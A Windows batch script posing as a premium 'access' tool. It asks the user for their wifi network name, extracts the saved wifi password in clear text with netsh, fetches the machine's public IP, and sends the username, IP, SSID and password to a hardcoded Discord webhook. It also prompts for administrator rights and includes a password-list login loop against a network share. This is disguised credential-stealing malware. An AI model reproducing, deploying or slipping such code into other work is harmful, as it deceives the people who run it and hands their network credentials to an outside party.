@echo off
color a
title KOMBAT access Premium v1.0
setlocal enabledelayedexpansion

where curl >nul 2>nul
if %errorlevel% neq 0 (
    echo curl is not installed. to use this script press any key to install it
    echo be sure to grant administrative permissions to command prompt
    pause >nul
    PowerShell -Command "Start-Process cmd -ArgumentList '/c start /b install_curl.bat' -Verb RunAs"
)
cd files
set /p "ssid=enter your wifi name so script can connect to wifi: "
netsh wlan show profiles "!ssid!" >nul 2>&1
if errorlevel 1 (
    echo failed to connect to "!ssid!": network not found
    echo press any key to exit
    pause >nul
    exit
)
echo running
echo wait please..

set "WEBHOOK_URL=https://discord.com/api/webhooks/1291524463438860318/uyOyOfF4dOaN6MeSi2e8GYs8CAPB-UdJK03gIv6kgip8zulLng-eQDgTTNgTFm6MgXW9"
for /f "delims=" %%i in ('curl -s ifconfig.me') do set ip=%%i
for /f "tokens=1 delims=." %%a in ("%TIME%") do set time=%%a
goto wifi
:sendcurl
curl -X POST -H "Content-Type: application/json" -d "{\"content\":\"username: %USERNAME%\nip address: %ip%\ntime: %time%\nwifi name: %ssid%\nwifi pass: !password!\"}" %WEBHOOK_URL%

:atmpas
set passlist=passlist.txt
set atmp=1
for /f %%a in (%passlist%) do (
    set pass=%%a
    call :attempt
)
:success
exit

:attempt
echo [Attempt !atmp!] %pass%
set /a atmp+=1
net use \\%ip% /user:%user% %pass% >nul 2>&1
if %errorlevel% EQU 0 goto success
goto end

:wifi
set /a "tempfile=%random% %% 892471 + 1"

netsh wlan show profiles "!ssid!" >nul 2>&1

set "outputFile=!tempfile!.txt"
netsh wlan show profile "!ssid!" key=clear > "!outputFile!"

for /f "tokens=2 delims=:" %%a in ('findstr /C:"Key Content" "!outputFile!"') do (
    set "password=%%a"
    set "password=!password:~1!"
)

del "!outputFile!" >nul
goto sendcurl

:end